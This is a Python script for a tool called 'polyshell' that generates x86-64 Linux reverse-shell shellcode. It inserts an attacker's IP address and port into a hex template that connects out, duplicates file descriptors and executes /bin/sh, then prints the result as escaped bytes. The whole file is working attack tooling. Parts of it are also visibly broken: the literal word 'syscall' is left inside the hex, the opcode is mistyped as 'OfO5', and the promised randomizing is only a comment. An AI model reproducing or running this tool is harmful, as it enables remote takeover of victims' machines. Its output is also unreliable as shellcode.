#!/usr/bin/env python3
from email.mime import base
import sys
import argparse
from polyshell import dechex
from polyshell import ipbloc
from polyshell import portbloc


def main():
    banner = '''
     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
    '''
    baseshell = "4831c04831db4831d24831ff4831f6b02940b70240b601syscall4989c7b02a4c89ff4831f6ip56port666a024889e6b218syscall4831c04831d2b0214c89ff4831f6syscall4831c04831d2b0214c89ff48ffc6syscall4d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d2syscallb03c4831ffsyscall"
    print(banner)
    parser = argparse.ArgumentParser(description='Tool to create polymorphique reverse shell')
    parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address')
    parser.add_argument('-p', '--port', dest='port', help='Port to bind')
    parser.add_argument('-e', '--endian', dest='endianness', choices=['big', 'little'], help='Endianness of the target', default='little')
    args = parser.parse_args()

    if len(sys.argv) < 7:
        parser.print_help()
        sys.exit(1)

    iphex = dechex.iphex(args.ip, args.endianness)
    porthex = dechex.porthex(args.port,args.endianness)

    if iphex:
        temp = str()

        temp = ipbloc.ipbloc(iphex)
        baseshell = baseshell.replace("ip",temp)

        temp = portbloc.portbloc(porthex)
        baseshell = baseshell.replace("port",temp)

        # function randomize : 
        # function shellcode
  
        res = '\\x'.join(baseshell[i:i + 2] for i in range(0, len(baseshell), 2)) 
        print("ShellCode :\n\\x" + res)
        print("===============================================")


        baseshell = baseshell.replace('syscall','OfO5')
        print("Baseshell without syscall :\n" + baseshell)
        print("===============================================")

        res = '\\x'.join(baseshell[i:i + 2] for i in range(0, len(baseshell), 2)) 
        print("ShellCode without syscall :\n\\x" + res)


        pass
    else:
        parser.print_help()
        sys.exit(1)
    
    #dechex.porthex(args.port, args.endianness)

if __name__ == '__main__':
    main()
